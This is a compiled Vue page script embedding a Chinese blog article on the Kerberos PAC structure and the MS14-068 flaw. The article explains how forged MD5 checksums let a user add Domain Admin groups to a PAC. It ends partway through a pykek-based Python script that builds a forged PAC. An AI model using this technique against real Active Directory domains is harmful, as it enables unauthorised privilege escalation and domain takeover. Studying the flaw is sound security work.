import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as n,o as t}from"./app-DS0ZCcmM.js";const l={};function h(e,s){return t(),a("div",null,s[0]||(s[0]=[n(`<h1 id="pac介绍" tabindex="-1"><a class="header-anchor" href="#pac介绍"><span>PAC介绍</span></a></h1><p>PAC由微软为了访问控制而引入，用于解决用户是否有权限访问目标服务的验证</p><ul><li>在AS_REQ流程中，请求凭据是用户hash加密的内容，如果解密正确KDC会返回krbtgt hash加密的TGT，TGT中就包含了PAC，PAC中包含了用户的sid,用户所在的组</li><li>在TGS_REQ流程中，用户原样返回TGT票据附带时间戳等信息，KDC使用krbtgt hash进行解密，成功则返回服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据，这也是kerberoating能利用的原因，任何一个用户，只要hash正确，可以请求域内任何一个服务的TGS票据)</li><li>服务使用自身的hash解密用户发来的TGS票据，使用其中的PAC去KDC询问用户是否有权限访问该服务，**域控解密PAC。获取用户的sid，以及所在的组，再判断用户是否有访问服务的权限，有访问权限(有些服务并没有验证PAC这一步，这也是白银票据能成功的前提，因为就算拥有用户hash，可以制作TGS，也不能制作PAC，PAC当然也验证不成功，但是有些服务不去验证PAC，这是白银票据成功的前提）**就允许用户访问。</li></ul><h2 id="pac结构" tabindex="-1"><a class="header-anchor" href="#pac结构"><span>PAC结构</span></a></h2><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/image001.png" alt="image001" tabindex="0" loading="lazy"><figcaption>image001</figcaption></figure><p>授权数据元素 AD-IF-RELEVANT是最外层的包装器。它封装了另一个类型为 AD-WIN2K-PAC 的 AuthorizationData 元素。此结构内部是 PACTYPE 结构，它用作实际 PAC 元素的标头。头部PACTYPE包括<code>cBuffers</code>,<code>版本</code>以及<code>缓冲区</code>，<code>PAC_INFO_BUFFER</code>为key-value型的</p><table><thead><tr><th>类型</th><th>意义</th></tr></thead><tbody><tr><td>0x00000001</td><td>登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。</td></tr><tr><td>0x00000002</td><td>凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。</td></tr><tr><td>0x00000006</td><td>服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。</td></tr><tr><td>0x00000007</td><td>KDC（特权服务器）校验和（第2.8节）。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。</td></tr><tr><td>0x0000000A</td><td>客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000B</td><td>受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000C</td><td>用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。</td></tr><tr><td>0x0000000D</td><td>客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000E</td><td>设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000F</td><td>设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。</td></tr></tbody></table><ul><li><p>0x00000001 <strong>KERB_VALIDATION_INFO</strong></p><p>登录信息，PAC使用该条目验证用户身份，整体是一个结构体</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">typedef</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> struct</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> _KERB_VALIDATION_INFO</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   FILETIME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LogonTime</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   FILETIME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LogoffTime</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   FILETIME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> KickOffTime</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   FILETIME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> PasswordLastSet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   FILETIME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> PasswordCanChange</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   FILETIME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> PasswordMustChange</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   RPC_UNICODE_STRING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> EffectiveName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   RPC_UNICODE_STRING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> FullName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   RPC_UNICODE_STRING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LogonScript</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   RPC_UNICODE_STRING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ProfilePath</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   RPC_UNICODE_STRING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> HomeDirectory</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   RPC_UNICODE_STRING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> HomeDirectoryDrive</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   USHORT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LogonCount</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   USHORT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> BadPasswordCount</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   ULONG</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> UserId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">//用户的sid</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   ULONG</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> PrimaryGroupId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   ULONG</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> GroupCount</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   [size_is(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">GroupCount</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)] </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">PGROUP_MEMBERSHIP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> GroupIds</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">//用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   ULONG</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> UserFlags</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   USER_SESSION_KEY</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> UserSessionKey</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   RPC_UNICODE_STRING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LogonServer</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   RPC_UNICODE_STRING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LogonDomainName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   PISID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LogonDomainId</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   ULONG</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Reserved1[2]</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   ULONG</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> UserAccountControl</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   ULONG</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SubAuthStatus</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   FILETIME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LastSuccessfulILogon</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   FILETIME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LastFailedILogon</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   ULONG</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> FailedILogonCount</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   ULONG</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Reserved3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   ULONG</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SidCount</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   [size_is(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">SidCount</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)] </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">PKERB_SID_AND_ATTRIBUTES</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ExtraSids</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   PISID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ResourceGroupDomainSid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">   ULONG</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ResourceGroupCount</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   [size_is(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">ResourceGroupCount</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)] </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">PGROUP_MEMBERSHIP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ResourceGroupIds</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">} KERB_VALIDATION_INFO;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>0x0000000A <strong>PAC_CLIENT_INFO</strong></p></li><li><p>客户端Id（8个字节）：</p><p>包含在Kerberos初始TGT的authtime</p></li><li><p>NameLength（2字节）</p><p>用于指定Name 字段的长度（以字节为单位）。</p></li><li><p>Name</p><p>包含客户帐户名的16位Unicode字符数组，格式为低端字节序。</p></li><li><p>0x00000006和0x00000007 0x00000006 对应的是服务检验和，0x00000007 对应的是KDC校验和。分别由server密码和KDC密码加密，是为了防止PAC内容被篡改。</p><p>存在签名的原因有两个。首先，存在带有服务器密钥的签名，以防止客户端生成自己的PAC并将其作为加密授权数据发送到KDC，以包含在票证中。其次，提供具有KDC密钥的签名，以防止不受信任的服务伪造带有无效PAC的票证。</p><p>两个都是PAC_SIGNATURE_DATA结构，他包括以下结构。 1. SignatureType（4个字节）</p></li></ul><table><thead><tr><th>类型</th><th>含义</th><th>签名长度</th></tr></thead><tbody><tr><td>0xFFFFFF76</td><td>KERB_CHECKSUM_HMAC_MD5</td><td>16</td></tr><tr><td>0x0000000F</td><td>HMAC_SHA1_96_AES128</td><td>12</td></tr><tr><td>0x00000010</td><td>HMAC_SHA1_96_AES256</td><td>12</td></tr></tbody></table></li></ul><h2 id="ms14068" tabindex="-1"><a class="header-anchor" href="#ms14068"><span>MS14068</span></a></h2><p><strong>Microsoft Windows Kerberos KDC无法正确检查Kerberos票证请求随附的特权属性证书（PAC）中的有效签名</strong></p><p>导致用户可以自己构造一张PAC</p><p>签名原本的设计是要用到HMAC系列的checksum算法，也就是必须要有key的参与，我们没有krbtgt的hash以及服务的hash，就没有办法生成有效的签名，但是问题就出在，实现的时候允许所有的checksum算法都可以，包括MD5。那我们只需要把PAC 进行md5，就生成新的校验和。这也就意味着我们可以随意更改PAC的内容，完了之后再用md5 给他生成一个服务检验和以及KDC校验和。在MS14-068修补程序之后，Microsoft添加了一个附加的验证步骤，以确保校验和类型为KRB_CHECKSUM_HMAC_MD5。</p><p><strong>目标：修改groupid 将当前用户加入到特殊组中，例如域管等</strong></p><p>pykek加入的是以下组,</p><ul><li>域用户（513）</li><li>域管理员（512）</li><li>架构管理员（518）</li><li>企业管理员（519）</li><li>组策略创建者所有者（520）</li></ul><p>现在我们已经明白了如何伪造PAC，常规情况下PAC是放在TGT内的，TGT由krbtgt的hash进行加密，我们无法得到这个hash即使能够伪造PAC，我们又怎么传递给KDC呢。pykek的作者将PAC加密成密文放在enc-authorization-data里面，enc-authorization-data的结构如下</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">AuthorizationData::</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SEQUENCE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> OF</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SEQUENCE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    ad-type[0]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Int32,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    ad-data[1]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> OCTET</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> STRING</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> }</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>ad-type是加密算法 ad-data是pac加密后的内容 加密用的key是客户端生成的。KDC并不知道这个key。KDC会从PA-DATA里面的AP_REQ获取到这个key。从而对ad-data进行解密，然后拿到PAC，再检查校验和。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/pac/1.png" alt="1" tabindex="0" loading="lazy"><figcaption>1</figcaption></figure><p>这是TGS_REQ的必选项，我们需要导入上一步得到的TGT票据，而得到TGT票据是不含PAC的</p><p>AP-REQ的定义</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>AP-REQ  ::= [APPLICATION 14] SEQUENCE {</span></span>
<span class="line"><span>        pvno            [0] INTEGER (5),</span></span>
<span class="line"><span>        msg-type        [1] INTEGER (14),</span></span>
<span class="line"><span>        ap-options      [2] APOptions,</span></span>
<span class="line"><span>        ticket          [3] Ticket,</span></span>
<span class="line"><span>        authenticator   [4] EncryptedData -- Authenticator</span></span>
<span class="line"><span>}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>TGT票据就放在ticket中， authenticator 的内容包括加密类型和用session_key加密Authenticator加密成的密文。 Authenticator的结构如下</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Authenticator</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ::=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [APPLICATION </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">2]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SEQUENCE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">  {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">     authenticator-vno</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">       [0] INTEGER (</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">),</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">     crealm</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">                  [1] Realm,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">     cname</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">                   [2] PrincipalName,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">     cksum</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">                   [3] Checksum OPTIONAL,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">     cusec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">                   [4] Microseconds,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">     ctime</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">                   [5] KerberosTime,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">     subkey</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">                  [6] EncryptionKey OPTIONAL,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">     seq-number</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">              [7] UInt32 OPTIONAL,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">     authorization-data</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      [8] AuthorizationData OPTIONAL</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中加密PAC的密钥就放在subkey里面,KDC拿到AP_REQ之后，提取里面authenticator的密文，用session_key解密获得subkey，再使用subkey解密enc-authorization-data获得PAC.而PAC是我们自己伪造的.</p><ul><li><p>申请一个不包含PAC的TGT票据</p></li><li><p>伪造PAC，这里用daiker写好的脚本</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> kek.pac </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> build_pac</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> kek.util </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> gt2epoch</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> kek.krb5 </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;"> AD_WIN2K_PAC</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, AuthorizationData, </span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">AD_IF_RELEVANT</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> pyasn1.codec.der.encoder </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> encode</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;__main__&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    user_realm </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;hack.com&quot;</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">  # 改成自己的</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    user_name </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;hacker&quot;</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">  # 改成自己的</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    user_sid </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;S-1-5-21-754643614-3937478331-2139222398-1116&quot;</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">  # 改成自己的</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    logon_time </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> gt2epoch</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;20231019064418Z&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    authorization_data </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">AD_WIN2K_PAC</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">build_pac</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(user_realm, user_name, user_sid, logon_time))</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    ad1 </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> AuthorizationData</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    ad1[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> None</span></span>
